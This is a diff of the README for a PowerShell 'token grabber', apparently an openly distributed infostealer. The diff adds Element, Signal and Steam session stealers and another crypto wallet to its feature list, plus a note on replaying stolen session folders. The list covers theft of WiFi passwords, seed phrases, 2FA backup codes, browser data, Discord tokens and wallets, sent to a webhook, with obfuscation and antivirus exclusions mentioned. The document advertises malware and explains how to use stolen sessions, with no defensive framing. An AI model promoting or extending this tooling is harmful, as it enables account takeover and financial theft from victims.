@@ -37,7 +37,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 
  ### Webhook Data
 > ![screenshot](https://user-images.githubusercontent.com/96607632/236490140-201f4987-3569-4542-a769-41cf09574f2d.png)
-> ![more data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/cfceaa6b-16d0-4a53-ad53-01052daccfcc)
+> ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/8a15c7d4-8d70-4d17-81c2-f9f602ccd81a)
 
 
 #  Features
@@ -48,9 +48,12 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] Extracts WiFi Passwords
 - [x] File grabber (sensitive files: ```2fa, backupcodes, seedphrases, passwords, etc.```) 
 - [x] Crypto Wallets 
-   > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Jaxx | Litecoin | Monero | Zcash
+   > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zcash
 - [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
-- [x] Telegram Session Stealer that [Bypasses 2FA](https://www.microsoft.com/en-ww/security/business/security-101/what-is-two-factor-authentication-2fa)
+- [x] Telegram Session Stealer 
+- [x] Element Session Stealer 
+- [x] Signal Session Stealer 
+- [x] Steam Session Stealer 
 - [x] Extracts Discord Token
 - [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
 - [x] Takes Desktop Screenshot  
@@ -75,7 +78,8 @@ Now, copy the tdata folder and paste it in the directory below:
 Before pasting the tdata folder, ensure that you have deleted the existing tdata folder on your PC.
 # ![image](https://user-images.githubusercontent.com/96607632/235702107-5800e44e-b4d3-4147-8fb0-b78aece6eae7.png)
 
-
+### NOTE 
+  ***The other session stealers can be utilized by applying the technique above***
  
 ## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder and ExclusionPaths)
 - Open a new Elevated Powershell Console and Paste the Contents below
